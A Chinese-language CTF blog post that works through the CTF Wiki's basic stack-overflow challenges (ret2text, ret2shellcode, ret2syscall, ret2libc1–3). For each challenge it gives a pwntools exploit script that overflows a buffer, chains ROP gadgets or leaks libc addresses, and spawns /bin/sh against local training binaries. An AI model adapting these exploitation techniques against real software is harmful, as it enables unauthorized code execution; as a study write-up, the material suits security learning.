---
title: Pwn(三) Stack Overflow实战(CTFWIKI)
date: 2022-1-9 14:09:00 +0800
author: sirius
categories: [CTF, pwn]
tags: [CTF, pwn]
math: false
typora-root-url: ../../SiriusHsh.github.io
typora-copy-images-to: ../assets/img/2022
---

## 基本ROP

CTF wiki上的题目都是32位的，32位的和64位的区别在于

> **函数参数**
>
> - X86
>
>   - 函数的参数放在栈上，在函数返回地址的下方(下方是指：返回地址在低地址，参数在高地址)
>
>     ![image-20220109222121679](/assets/img/2022/image-20220109222121679.png){: .normal}
>
>     就像这样调用gets前，将参数（这里是待赋值的变量的地址）压入栈（放在esp上）
>     
>     ![image-20220123230823721](/assets/img/2022/image-20220123230823721.png)
>
> - x64
>
>   - 函数的前6个参数放在寄存器里，其余的才会放在栈上

> **系统调用**
>
> - x86
>   - 寄存器： %eax, arg0(%ebx), arg1(%ecx), arg2(%edx)  .etc
>   - 系统调用 int 0x80
> - x64
>   - 寄存器：%rax, arg0(%rdi), arg1(%rsi), arg2(%rbx)   .etc
>   - 系统调用 syscall

### ret2text

通过debug一下

![image-20220109225355822](/assets/img/2022/image-20220109225355822.png)

可以看到，实际上s相较于ebp的偏移是0x6c个字节。

![image-20220109225923257](/assets/img/2022/image-20220109225923257.png)

exp:

```python
from pwn import *

r = process('./ret2text')

magic_addr = 0x804863A
r.recvuntil('anything?\n')
p = 'a'*(0x6c+0x4)+p32(magic_addr)
r.sendline(p)

r.interactive()
```

### ret2shellcode

![image-20220123221740937](/assets/img/2022/image-20220123221740937.png)

```python
from pwn import *


r = process('./ret2shellcode')

r.recvuntil('!!!\n')
shell = asm(shellcraft.sh())
p = shell.ljust(0x6c+0x4, 'a') + p32(0x0804A080)

r.sendline(p)

r.interactive()
```

### ret2syscall

![image-20220123220116190](/assets/img/2022/image-20220123220116190.png)

![image-20220123221254741](/assets/img/2022/image-20220123221254741.png)

```python
from pwn import *


r = process('./rop')

r.recvuntil('plan to do?\n')

pop_eax = 0x080bb196 # pop eax ; ret
pop_edx_ecx_ebx = 0x0806eb90 # pop edx ; pop ecx ; pop ebx ; ret
int_0x80 = 0x08049421 # int 0x80
sh = 0x080be408 # /bin/sh

p = 'a'*(0x6c+0x4)
p += p32(pop_edx_ecx_ebx)
p += p32(0)
p += p32(0)
p += p32(sh)
p += p32(pop_eax)
p += p32(0xb)
p += p32(int_0x80)

r.sendline(p)
r.interactive()
```



### ret2libc1

![image-20220123230431106](/assets/img/2022/image-20220123230431106.png)

```python
from pwn import *


r = process('./ret2libc1')

r.recvuntil('RET2LIBC >_<\n')

bin_sh = 0x08048720 # /bin/sh
system = 0x8048460 # <system@plt>

p = 'a'*(0x6c+0x4)
p += p32(system)
p += 'b'*4
p += p32(bin_sh)


r.sendline(p)

r.interactive()
```

### ret2libc2

![image-20220202133831109](/assets/img/2022/image-20220202133831109.png)

**方法2，payload也可以这么写**

![image-20220202135029372](/assets/img/2022/image-20220202135029372.png)

exp:

```python
from pwn import *


r = process('./ret2libc2')
elf = ELF('./ret2libc2')

r.recvuntil('think ?')

gets_plt = elf.plt['gets']
system_plt = elf.plt['system']
_start= elf.symbols['_start']
bss_addr = 0x804A080

pause()
p = 'a'*(0x6c+0x4)
# p += p32(gets_plt)
# p += p32(system_plt)
# p += p32(bss_addr)
# p += p32(bss_addr)
p += p32(gets_plt)
p += p32(_start)
p += p32(bss_addr)
r.sendline(p)

r.sendline('/bin/sh')

r.recvuntil('think ?')
p = 'a'*(0x6c+0x4)
p += p32(system_plt)
p += p32(0xdeadbeef)
p += p32(bss_addr)
r.sendline(p)

r.interactive()
```

### ret2libc3

![image-20220204103931275](/assets/img/2022/image-20220204103931275.png)

Exp:

```python
# -*- coding: UTF-8 -*- #
from pwn import *
from LibcSearcher import *

r = process('./ret2libc3')
elf = ELF('./ret2libc3')
# 程序开始处，_start可以保证变量在栈上的偏移量不变。
# main可能会变，__libc_start_main不清楚
_start = elf.symbols['_start']
# 调用puts，泄露信息，实际是调用puts_plt
puts_plt = elf.plt['puts'] 
# 企图泄露got表上puts的实际值，也就是puts在libc上的实际地址
# 通过LibcSearcher工具，利用泄露的实际地址的最后12位，查询得到libc的版本
# libc的版本确定，libc上每个函数的偏移量确定，通过libc基地址算出system等函数的实际地址
puts_got = elf.got['puts']
# 调用gets，向bss写入/bin/sh
gets_plt = elf.plt['gets']
# 可写的bss段，程序应该是定义了一个全局变量 char buf2[100]
buf = 0x0804A080


# 第一轮，泄露puts地址
r.recvuntil('Can you find it !?')
p = 'a'*(0x6c+0x4)
p += p32(puts_plt)
p += p32(_start)
p += p32(puts_got)

r.sendline(p)

puts_addr = u32(r.recvline()[:4])
log.success('puts在libc上的地址: {}'.format(hex(puts_addr)))

# 计算得到libc基地址，以及system等函数的地址
obj = LibcSearcher('puts', puts_addr)
puts_offset = obj.dump('puts')
system_offset = obj.dump('system')
libc_base = puts_addr - puts_offset
system_addr = libc_base + system_offset
log.success('libc基地址: {}'.format(hex(libc_base)))
log.success('system地址: {}'.format(hex(system_addr)))

# 第二轮，向buf中写入/bin/sh，并调用system('/bin/sh')
r.recvuntil('Can you find it !?')
p = 'a'*(0x6c+0x4)
p += p32(gets_plt)
p += p32(system_addr)
p += p32(buf)
p += p32(buf)

r.sendline(p)
r.sendline('/bin/sh')


'''或者可以将第二轮拆成两轮
# 第二轮，向buf中写入/bin/sh
r.recvuntil('Can you find it !?')
p = 'a'*(0x6c+0x4)
p += p32(gets_plt)
p += p32(_start)
p += p32(buf)

r.sendline(p)
r.sendline('/bin/sh')


# 第三轮，调用system('/bin/sh')
r.recvuntil('Can you find it !?')
p = 'a'*(0x6c+0x4)
p += p32(system_addr)
p += p32(0xdeadbeef)
p += p32(buf)
r.sendline(p)
'''
r.interactive()
```



## 中级ROP







## 高级ROP

